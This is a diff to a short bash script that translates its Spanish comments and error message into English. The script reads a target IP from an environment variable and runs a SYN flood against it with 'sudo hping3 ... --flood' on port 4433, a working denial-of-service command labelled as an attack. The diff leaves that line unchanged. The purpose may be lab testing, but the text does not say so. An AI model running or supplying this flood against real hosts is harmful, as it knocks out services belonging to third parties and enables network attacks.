@@ -1,10 +1,10 @@
 #!/bin/bash
 
-# Verifica si la variable de entorno DDOS_SERVER está definida
+# Check if the DDOS_SERVER environment variable is defined
 if [ -z "$ddosserver" ]; then
-  echo "La variable de entorno ddosserver no está definida. Ejecuta export ddosserver=¨ip¨"
+  echo "An IP address was not provided for the server. Make sure to set the ddosserver environment variable. Run export ddosserver=¨ip¨"
   exit 1
 fi
 
-# Utiliza la variable de entorno DDOS_SERVER como la dirección del servidor de ataque
+# Use the DDOS_SERVER environment variable as the attack server's address
 sudo hping3 -c 200 -d 200000000 -S "$ddosserver" -p 4433 --flood
